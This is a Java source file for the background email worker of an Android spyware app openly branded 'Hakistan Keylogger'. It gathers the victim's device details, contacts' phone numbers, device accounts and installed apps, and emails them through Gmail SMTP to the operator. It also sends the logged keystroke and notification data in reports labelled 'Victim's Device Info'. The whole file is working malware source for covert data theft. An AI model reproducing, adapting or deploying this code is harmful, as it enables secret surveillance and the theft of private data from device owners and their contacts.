package com.hak15tan.hakistankeylogger;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.Patterns;
import android.view.Display;
import android.view.WindowManager;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;
import java.util.regex.Pattern;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import static android.content.Context.MODE_PRIVATE;
import static android.os.Build.MANUFACTURER;

public class EmailWorker extends Worker {

    private Context ctx;
    private String ContactsList = "\nList Of Contacts: \n";

    private static final String TAG = "EmailWorker";
    private Multipart _multipart;
    public static final String MY_PREFS_NAME = "GPrefs";
    public static final String MY_PREFS_STRING_KEY = "GPrefsStringsKey";

    public static final String MY_PREFS_Notification_Count_KEY = "GPrefsNotificationCountKey";
    public static final String MY_PREFS_Text_Count_KEY = "GPrefsText_CountKey";
    public static final String MY_PREFS_FOCUSED_Count_KEY = "GPrefsFOCUSED_CountKey";
    public static final String MY_PREFS_Clicks_Count_KEY = "GPrefsClicks_CountKey";

    //private String DataToSend = "";
    //private String email = "dashdashpass7@gmail.com";
    String email = "";
    //private String password = "createpassword.";
    String password = "";//getResources().getString(R.string.Password);

    public EmailWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        ctx = context;
    }

    @NonNull
    @Override
    public Result doWork() {

        Log.i(TAG,"Again Started EMail Work!");

        _multipart = new MimeMultipart("related");

        email=ctx.getResources().getString(R.string.EMail);
        password=ctx.getResources().getString(R.string.Password);

        SharedPreferences prefs = ctx.getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE);

        SharedPreferences.Editor editor = ctx.getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE).edit();


        String DataToSend = prefs.getString(MY_PREFS_STRING_KEY, "Hakistan Keylogger \n");//"No name defined" is the default value.


       // Log.i(TAG,"Going To Send Email!");


        //addAttachment();

        if (prefs.getBoolean("FirstRun",true)){

            String Sysinfo = getSYSInfo();
            String ContactsList = getContactList();
            String AccountsList = getAccountsList();

            sendMail(email,"Hakistan Keylogger's First Report",Sysinfo + "\n" + ContactsList + "\n" + AccountsList+ "\n\n<End Of Message>\n|* Hakistan Keylogger For Android *|\nSupport Us On Youtube(https://youtube.com/hakistan) \nReport Issues on Telegram(https://t.me/hakistan_chat)");

            editor.putBoolean("FirstRun",false);
            editor.apply();
        }


        if (DataToSend.trim().length() > 0) {

            Long perviousNotiCountData = prefs.getLong(MY_PREFS_Notification_Count_KEY,0);//"No name defined" is the default value.
            Long perviousTextCountData = prefs.getLong(MY_PREFS_Text_Count_KEY,0);//"No name defined" is the default value.
            Long perviousFocusedCountData = prefs.getLong(MY_PREFS_FOCUSED_Count_KEY,0);//"No name defined" is the default value.
            Long perviousClicksCountData = prefs.getLong(MY_PREFS_Clicks_Count_KEY,0);//"No name defined" is the default value.

            String deviceDetails = "MANUFACTURER : "+Build.MANUFACTURER
                    +"\nMODEL : "+Build.MODEL
                    +"\nPRODUCT : "+Build.PRODUCT
                    +"\nSERIAL : "+Build.SERIAL
                    +"\nVERSION.RELEASE : "+ Build.VERSION.RELEASE
                    +"\nVERSION.INCREMENTAL : "+Build.VERSION.INCREMENTAL
                    +"\nVERSION.SDK.NUMBER : "+Build.VERSION.SDK_INT
                    +"\nBOARD : "+Build.BOARD
                    //+"\nScreen Width : "+width
                    //+"\nScreen Height : "+height
                    +"\nBOOTLOADER : "+Build.BOOTLOADER
                    +"\nBRAND : "+Build.BRAND
                    +"\nCPU_ABI : "+Build.CPU_ABI
                    +"\nCPU_ABI2 : "+Build.CPU_ABI2
                    +"\nFINGERPRINT : "+Build.FINGERPRINT;

            sendMail(email, "Hakistan Keylogger's Report, NOTIFICATIONS:" + perviousNotiCountData + " CLICKS: "+perviousClicksCountData + " TEXT: " + perviousTextCountData + " FOCUSED:"+perviousFocusedCountData, "Victim's Device Info : \n"+deviceDetails + "\n\n" + DataToSend + "\n\n<End Of Message>\n|* Hakistan Keylogger For Android *|\nSupport Us On Youtube(https://youtube.com/hakistan) \nReport Issues on Telegram(https://t.me/hakistan_chat)");

            editor.putLong(MY_PREFS_Notification_Count_KEY, 0);
            editor.putLong(MY_PREFS_Text_Count_KEY, 0);
            editor.putLong(MY_PREFS_FOCUSED_Count_KEY, 0);
            editor.putLong(MY_PREFS_Clicks_Count_KEY, 0);

            editor.apply();

        }
        //Log.i(TAG,"Email SEnt!");

       // DataToSend = "";

        //Log.i("Gservice", i+" Email Sent!");
        editor.putString(MY_PREFS_STRING_KEY, "");
        //editor.putInt("idName", 12);
        editor.apply();

       // Log.i(TAG,"send Success Message to System!");

        return Result.success();
    }

    private void sendMail(String email, String subject, String messageBody)
    {
        Session session = createSessionObject();

        try {
            Message message = createMessage(email, subject, messageBody, session);
            try {
                Transport.send(message);
            } catch (MessagingException e) {
                e.printStackTrace();
            }
        } catch (AddressException e) {
            e.printStackTrace();
        } catch (MessagingException e) {
            e.printStackTrace();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    private Message createMessage(String email, String subject, String messageBody, Session session) throws MessagingException, UnsupportedEncodingException {
        Message message = new MimeMessage(session);
        message.setFrom(new InternetAddress("keylogger@hakistan.org", "Hakistan Keylogger"));
        message.addRecipient(Message.RecipientType.TO, new InternetAddress(email, email));
        message.setSubject(subject);
        message.setText(messageBody);
       // message.setContent();
/*
        String filename = Environment.getExternalStorageDirectory().getAbsolutePath() + "/my_test_contact.csv";
        if (!"".equals(filename)) {
            Multipart _multipart = new MimeMultipart();
            BodyPart messageBodyPart = new MimeBodyPart();
            DataSource source = new FileDataSource(filename);

            messageBodyPart.setDataHandler(new DataHandler(source));
            messageBodyPart.setFileName(filename);

            _multipart.addBodyPart(messageBodyPart);
            message.setContent(_multipart);
        }
*/
       // message.setContent(_multipart,"messageBody Should be here!");
        return message;
    }

    private Session createSessionObject() {
        Properties properties = new Properties();
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.host", "smtp.gmail.com");
        properties.put("mail.smtp.port", "587");

        return Session.getInstance(properties, new javax.mail.Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(email, password);
            }
        });
    }

    private String getAccountsList(){

        String AccountDetails = "\nList Of Accounts: \n\nType : Username\n";

            ArrayList<String> emails = new ArrayList<>();

            Pattern gmailPattern = Patterns.EMAIL_ADDRESS;
            Account[] accounts = AccountManager.get(ctx).getAccounts();
            for (Account account : accounts) {

                AccountDetails = AccountDetails + account.type + " : " + account.name + "\n";

                //emails.add(account.name);

                // if (gmailPattern.matcher(account.name).matches()) {
                //   emails.add(account.name);
                //}
            }

      //      Log.i(TAG, AccountDetails);


        return AccountDetails;

    }

    private String getContactList() {
        ContentResolver cr = ctx.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        // Log.i(TAG, "Name: " + name);

                        ContactsList = ContactsList + phoneNo +"\n";

                        //  Log.i(TAG, "Phone Number: " + phoneNo);
                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }

      //  Log.i(TAG, ContactsList);


        return ContactsList;
    }



    private String getSYSInfo(){

        WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        assert wm != null;
        Display display = wm.getDefaultDisplay();
        DisplayMetrics metrics = new DisplayMetrics();
        display.getMetrics(metrics);
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        @SuppressLint("HardwareIds")
        String SystemData = "\nDevice Information: \n";


        SystemData = SystemData+ "VERSION.RELEASE : "+ Build.VERSION.RELEASE
                +"\nVERSION.INCREMENTAL : "+Build.VERSION.INCREMENTAL
                +"\nVERSION.SDK.NUMBER : "+Build.VERSION.SDK_INT
                +"\nBOARD : "+Build.BOARD
                +"\nScreen Width : "+width
                +"\nScreen Height : "+height
                +"\nBOOTLOADER : "+Build.BOOTLOADER
                +"\nBRAND : "+Build.BRAND
                +"\nCPU_ABI : "+Build.CPU_ABI
                +"\nCPU_ABI2 : "+Build.CPU_ABI2
                +"\nDISPLAY : "+Build.DISPLAY
                +"\nFINGERPRINT : "+Build.FINGERPRINT
                +"\nHARDWARE : "+Build.HARDWARE
                +"\nHOST : "+ Build.HOST
                +"\nID : "+Build.ID
                +"\nMANUFACTURER : "+ MANUFACTURER
                +"\nMODEL : "+Build.MODEL
                +"\nPRODUCT : "+Build.PRODUCT
                +"\nSERIAL : "+Build.SERIAL
                +"\nTAGS : "+Build.TAGS
                //+"\nTIME : "+Build.TIME
                +"\nTYPE : "+Build.TYPE
                +"\nUNKNOWN : "+Build.UNKNOWN
                +"\nUSER : "+Build.USER
                + "\nANDROID ID : " + Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);


        // Log.i(TAG,details);

        ApkInfoExtractor apkInfoExtractor = new ApkInfoExtractor(getApplicationContext());

        List<String> arrayList = new ApkInfoExtractor(getApplicationContext()).GetAllInstalledApkInfo();
        // String ApplicationLabelName = apkInfoExtractor.GetAppName(ApplicationPackageName);

        String InstalledAppsPkg = "";

        for (String item : arrayList){

            String ApplicationLabelName = apkInfoExtractor.GetAppName(item);

            InstalledAppsPkg= InstalledAppsPkg + ApplicationLabelName + " : " + item + "\n";


        }

        SystemData  = SystemData + "\n\nList Of Installed Apps:\n" + "App Name : Package Name\n" + InstalledAppsPkg + "\n";

        //Log.i(TAG, SystemData);

        return SystemData;
    }



}

